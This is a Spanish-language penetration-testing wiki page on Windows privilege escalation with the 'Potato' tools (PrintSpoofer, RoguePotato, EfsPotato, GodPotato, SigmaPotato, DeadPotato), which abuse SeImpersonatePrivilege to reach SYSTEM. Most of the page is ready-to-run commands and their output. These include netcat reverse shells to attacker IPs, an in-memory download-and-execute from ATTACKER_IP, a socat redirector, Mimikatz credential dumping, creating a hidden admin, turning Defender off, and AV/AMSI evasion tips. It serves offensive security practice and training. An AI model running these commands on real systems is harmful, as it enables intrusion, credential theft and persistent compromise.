# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** en Windows Server 2019 y Windows 10 build 1809 en adelante. Sin embargo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** pueden usarse para **aprovechar los mismos privilegios y obtener acceso a nivel `NT AUTHORITY\SYSTEM`**. Este [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) profundiza en la herramienta `PrintSpoofer`, que puede usarse para abusar de privilegios de impersonación en hosts con Windows 10 y Server 2019 donde JuicyPotato ya no funciona.

> [!TIP]
> Una alternativa moderna mantenida con frecuencia en 2024–2025 es SigmaPotato (un fork de GodPotato) que añade uso en memoria/.NET reflection y soporte extendido de OS. Ver uso rápido abajo y el repo en References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements and common gotchas

Todas las siguientes técnicas dependen de abusar de un servicio privilegiado con capacidad de impersonación desde un contexto que tenga cualquiera de estos privilegios:

- SeImpersonatePrivilege (el más común) o SeAssignPrimaryTokenPrivilege
- No se requiere integridad alta si el token ya tiene SeImpersonatePrivilege (típico para muchas cuentas de servicio como IIS AppPool, MSSQL, etc.)

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
Notas operativas:

- Si tu shell se ejecuta bajo un token restringido que carece de SeImpersonatePrivilege (común para Local Service/Network Service en algunos contextos), recupera los privilegios predeterminados de la cuenta usando FullPowers, y luego ejecuta un Potato. Ejemplo: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer necesita que el servicio Print Spooler esté en ejecución y accesible a través del endpoint RPC local (spoolss). En entornos endurecidos donde Spooler está deshabilitado tras PrintNightmare, prefiere RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requiere un OXID resolver accesible en TCP/135. Si el egress está bloqueado, usa un redirector/port-forwarder (ver ejemplo más abajo). Las builds antiguas necesitaban el flag -f.
- EfsPotato/SharpEfsPotato abusan de MS-EFSR; si una pipe está bloqueada, prueba pipes alternativos (lsarpc, efsrpc, samr, lsass, netlogon).
- El error 0x6d3 durante RpcBindingSetAuthInfo normalmente indica un servicio de autenticación RPC desconocido/no soportado; prueba otra pipe/transport o asegúrate de que el servicio objetivo esté en ejecución.
- Los forks "kitchen-sink" como DeadPotato empaquetan módulos de payload adicionales (Mimikatz/SharpHound/Defender off) que tocan el disco; espera detección EDR más alta comparado con los originales slim.

## Demostración rápida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notas:
- Puedes usar -i para iniciar un proceso interactivo en la consola actual, o -c para ejecutar un comando de una sola línea.
- Requiere el servicio Spooler. Si está deshabilitado, esto fallará.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Si el puerto 135 saliente está bloqueado, realiza un pivot del OXID resolver vía socat en tu redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato es una nueva primitive de abuso de COM lanzada a finales de 2022 que apunta al servicio **PrintNotify** en lugar de Spooler/BITS. El binario instancia el servidor COM de PrintNotify, intercambia un `IUnknown` falso y luego desencadena una devolución de llamada privilegiada mediante `CreatePointerMoniker`. Cuando el servicio PrintNotify (ejecutándose como **SYSTEM**) se conecta de vuelta, el proceso duplica el token devuelto y ejecuta la payload proporcionada con privilegios completos.

Key operational notes:

* Funciona en Windows 10/11 y Windows Server 2012–2022 siempre que el servicio Print Workflow/PrintNotify esté instalado (está presente incluso cuando el Spooler heredado está deshabilitado tras PrintNightmare).
* Requiere que el contexto que llama tenga **SeImpersonatePrivilege** (típico en cuentas de servicio IIS APPPOOL, MSSQL y de tareas programadas).
* Acepta un comando directo o un modo interactivo para que puedas permanecer dentro de la consola original. Ejemplo:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Debido a que se basa puramente en COM, no se requieren listeners de named-pipe ni redireccionadores externos, lo que lo convierte en un reemplazo directo en hosts donde Defender bloquea el binding RPC de RoguePotato.

Operadores como Ink Dragon ejecutan PrintNotifyPotato inmediatamente después de obtener ViewState RCE en SharePoint para pivotar del worker `w3wp.exe` a SYSTEM antes de instalar ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Consejo: Si una pipe falla o EDR la bloquea, prueba las otras pipes soportadas:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notas:
- Funciona en Windows 8/8.1–11 y Server 2012–2022 cuando SeImpersonatePrivilege está presente.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato proporciona dos variantes que apuntan a objetos DCOM de servicio que por defecto usan RPC_C_IMP_LEVEL_IMPERSONATE. Compila o usa los binaries proporcionados y ejecuta tu comando:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork de GodPotato actualizado)

SigmaPotato añade mejoras modernas como ejecución en memoria vía .NET reflection y un helper de PowerShell para reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Bandera integrada de reverse shell `--revshell` y eliminación del límite de 1024 caracteres de PowerShell para que puedas lanzar payloads largos que evaden AMSI de una sola vez.
- Sintaxis compatible con Reflection (`[SigmaPotato]::Main()`), además de un truco rudimentario de evasión de AV vía `VirtualAllocExNuma()` para confundir heurísticas simples.
- `SigmaPotatoCore.exe` separado compilado contra .NET 2.0 para entornos PowerShell Core.

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato mantiene la cadena de suplantación OXID/DCOM de GodPotato pero incorpora helpers de post-exploitation para que los operadores puedan tomar SYSTEM de inmediato y realizar persistencia/colección sin herramientas adicionales.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — ejecutar un comando arbitrario como SYSTEM.
- `-rev <ip:port>` — reverse shell rápido.
- `-newadmin user:pass` — crear un admin local para persistencia.
- `-mimi sam|lsa|all` — dejar y ejecutar Mimikatz para volcar credenciales (toca el disco, ruidoso).
- `-sharphound` — ejecutar la colección SharpHound como SYSTEM.
- `-defender off` — desactivar la protección en tiempo real de Defender (muy ruidoso).

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Debido a que incluye binarios adicionales, espera más flags de AV/EDR; usa las versiones más ligeras GodPotato/SigmaPotato cuando importe stealth.

## Referencias

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
